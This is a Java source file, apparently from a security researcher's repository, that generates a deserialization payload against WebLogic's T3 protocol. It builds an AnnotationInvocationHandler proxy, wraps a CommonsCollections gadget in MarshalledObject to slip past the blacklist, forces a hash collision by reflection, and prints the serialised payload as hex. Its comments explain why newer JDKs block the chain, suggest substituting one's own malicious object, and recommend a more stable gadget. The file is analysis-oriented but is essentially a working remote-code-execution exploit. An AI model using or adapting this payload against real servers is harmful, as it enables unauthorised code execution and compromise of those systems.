package com.pinger.javasec.weblogic;

import cn.hutool.core.util.HexUtil;
import com.pinger.javasec.common.CC1;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.MarshalledObject;
import java.util.HashMap;
import java.util.Map;

/**
 * @author : p1n93r
 * @date : 2021/4/20 9:18
 * 分析2021-4月hvv爆出的weblogic 0day:T3 反序列化攻击链
 */
public class T320210421 {

    public static void main(String[] args) throws Exception{
        // 避免反序列化AnnotationInvocationHandler异常，随便填充一个Map
        HashMap<Object, Object> tmp = new HashMap<>(0);
        tmp.put("p1n93r",0);

        // 创建AnnotationInvocationHandler对象,重点是其type必须是MarshalledObject.class，否则后续攻击链不能进行
        // 高版本的JDK不能利用的原因也在这，高版本的JDK，实例化AnnotationInvocationHandler时检查了其type是有且仅实现了Annotation接口
        // MarshalledObject显然不符合要求，所以高版本JDK没法打
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(MarshalledObject.class, tmp);

        // 构造代理类对象，随便某个类型即可，处理器为invocationHandler，目的是触发InvocationHandler#invoke()-->InvocationHandler#equalsImpl()
        Map someObj = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);
        // 绕过黑名单的关键类
        // 此处的CC1.getObject("mspaint")，换成你的恶意反序列化对象即可，我这里是使用CC1 payload
        // 测试发现CC6比较稳定，推荐使用CC6
        MarshalledObject<InvocationHandler> bypassObj = new MarshalledObject<>(CC1.getObject("mspaint"));

        // 构造一个HashMap，目的是反序列化时，产生Hash碰撞进入恶意执行链
        HashMap<Object, Object> res = new HashMap<>();
        res.put(someObj,1);
        res.put(bypassObj,1);

        // 通过反射修改bypassObj的hashcode，使得其hashcode和someObj的hashcode一样，就可以产生hash碰撞了
        Class<? extends MarshalledObject> marshalledObjectClazz = bypassObj.getClass();
        Field hash = marshalledObjectClazz.getDeclaredField("hash");
        hash.setAccessible(true);
        hash.set(bypassObj,someObj.hashCode());

        System.out.println("someObje's hashCode:"+someObj.hashCode());
        System.out.println("bypassObj's hashCode:"+bypassObj.hashCode());

        // 测试反序列化RCE
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
        objectOutputStream.writeObject(res);
        objectOutputStream.close();

        // 将Payload进行16进制字符串转换
        String resPayload = HexUtil.encodeHexStr(outputStream.toByteArray());
        System.out.println(resPayload);

        // System.out.println(outputStream);
         new ObjectInputStream(new ByteArrayInputStream(outputStream.toByteArray())).readObject();
    }






}
